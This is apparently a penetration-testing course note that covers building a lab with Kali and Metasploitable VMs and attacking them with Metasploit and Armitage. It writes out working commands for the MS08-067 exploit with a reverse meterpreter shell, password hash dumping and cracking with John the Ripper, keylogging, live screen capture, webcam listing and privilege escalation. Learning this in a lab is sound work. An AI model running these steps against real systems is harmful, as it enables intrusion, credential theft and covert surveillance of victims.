# Penetration Testing

- Lockheed Martin Cyber Kill Chain Framework describes various stages of penetration testing
- https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html


## Fast and Easy Hacking with Armitage
- NOTE - Armitage not working on Kali x86-64 2020; use metasploit cmd line
- https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/
- metasploit fundamentals - https://www.offensive-security.com/metasploit-unleashed/metasploit-fundamentals/

```
sudo apt install metasploit-framework
sudo msfdb
sudo msfdb init
sudo msfdb start
sudo msfdb run # run msf console
```

## Setup Tools and Netowork

### Create a hacking Network with VMs

- need farily good system with atleast 8 cores, 8 GB RAM and about 50 GB of hard drive space
- have complete control of the VMs as if they're a separate physical system

#### Create an attacker VM

- 1. Download Kali 64-bit pre-built VM for your virtualization software (VMWare, VirtualBox, UTM, etc.)

#### Create a vulnerable target VM

- NOTE metasploitables are deliberately vulnerable systems created for pen-testing and testing exploits for metasploit
- Do not expose these systems to the Internet and keep 'em shut when not using

1. Metaspolitable 2 as a VM
    - https://metasploit.help.rapid7.com/docs/metasploitable-2
    - There's an ISO you can download and install as a VM
    - documentation: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
2. Metasploitable 3 as a VM
    - https://github.com/rapid7/metasploitable3
    - Needs to be built 
3. A Windows VM preferably older sytem such as Win XP-SP2, Win 2008 server, Windows Vista, etc.

### Create a hacking Network with Docker

- doesn't require great resource
- may be limited on what you can do; installing and using GUI tools can be challenging
- see `demos/pentest` folder for a docker network using docker-compose file
- 

### Hackaway...

1. Run Kali and the Victim VMs
2. Find IP addresses of all the VMs and make sure they can talk to each other
    - from Kali ping each victim VMs
3. Run Armitage
4. Clear database if you see existing hosts
5. Add hosts one by one
6. Run comprehensive scan from Hosts -> Nmap Scans
7. Find attacks for each host under Attacks
8. Pick and launch each attack
9. Run Hail Mary under Attacks
10. Once the system is successfully compromised, you'll see a lightning symbol around it
11. Interact with each pawned system

### Hacking Windows XP Service Pack 2

- run the victim XP service pack 2 VM
    - Note: login to the system, as exploiting the logoff system seems to be crashing and rebooting the machine loosing the exploit connection
- find the IP address of Windows using ipconfig from command prompt

### Demo Screenshot
![](./media/pawned_system.png)
![](./media/meterpreter.png)
![](./media/screen-capture.png)
![](./media/hashdump.png)

## Metasploit Framework

- Online Documentation: https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
- run metasploit framework: Kali Application -> Exploitation Tools -> Metasploit Framework

```bash
msf6 > ? # run help
msf6 > search smb type:exploit platform:windows
```
- you can click on each exploit and try one at a time
- configure the exploit parameter espcially RHOST and RPORT on the pop window if armitage works!

```bash
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 > show options
msf6 > set RHOST Target-IP
msf6 > show targets # list all the possible targets the exploit may potentially work
msf6 > show payloads
msf6 > exploit -j # launch the exploit
msf6 > sessions # list the sessions if exploit is successful
msf6 > sessions -i Id # interact using each session id
meterpreter > ? # see all the commands
```
- use default `windows/meterpreter/reverse_tcp` payload
- for everything else use default parameters

### post exploitation
- detail examples: https://www.hackers-arise.com/post/2018/10/16/metasploit-basics-part-15-post-exploitation-fun-web-cam-microphone-passwords-and-more

### check webcameras

```bash
meterpreter> webcam_list
```

### Execute native system command prompt/shell

- drop into the system command shell

```bash
meterpreter > shell # C:\> Command Prompt
C:\>dir
```

### dump hashes

```bash
meterpreter > hashdump
```

- crack passwords with John the Ripper or online crackers
- copy and paste the hashes into a text file
- Google online password crackers and crack user password
    - "john the ripper" is installed in Kali
- see this blog, e.g.: https://www.freecodecamp.org/news/crack-passwords-using-john-the-ripper-pentesting-tutorial/
- windows password cracking

```bash
$ john --format=NT --wordlist=/usr/share/john/password.lst hashdumpfile.txt
$ john --format=lm hashdumpfile.txt
```

- login to the system without cracking password
- https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/

### Take screencapture of victim system in real-time

- https://www.offensive-security.com/metasploit-unleashed/screen-capture/
- do something on the target machine to see live capture

```bash
meterpreter > screenshare
ctrl+c to stop screenshare function
```

### Keylogging

- meterpreter can place a software keylogger to capture software keystrokes from some applications
- migrate the meterpreter to a process where we expect the target will be entering data - e.g., MS Word, Outlook, etc.

```bash
meterpreter > ps # list all the running processes
meterpreter > migrate <PID> # PIE of IE explorer.exe 
meterpreter > keyscan_start # type something on the IE explorer
meterpreter > keyscan_dump # dump the key strokes
```

### Escalate Priviledge
- get admin/root priviledge

```bash
meterpreter > getsystem
meterpreter > getuid
meterpreter > sysinfo
```

- download .wav file; upload and play it on victim's computer
- sample .wav files: https://www2.cs.uic.edu/~i101/SoundFiles/ 

```bash
meterpreter > cd C:/ # change to C drive
meterpreter > upload ~/
```

## Exploiting Metasploitable 2 VM
- run the victim machine and find its IP address
- run armitage
- add victim's IP address: Hosts -> Add Hosts...
- right click on host and scan

```ash
msf6>  search vsftpd
msf6 > sessions -i 3
```

- some screenshots

![](./media/hailmary-metasploitable.png)
![](./media/linux-shells.png)
![](./media/linux-exploit-vsftpd.png)
![](./media/linux-postgre-exploit.png)




```python

```
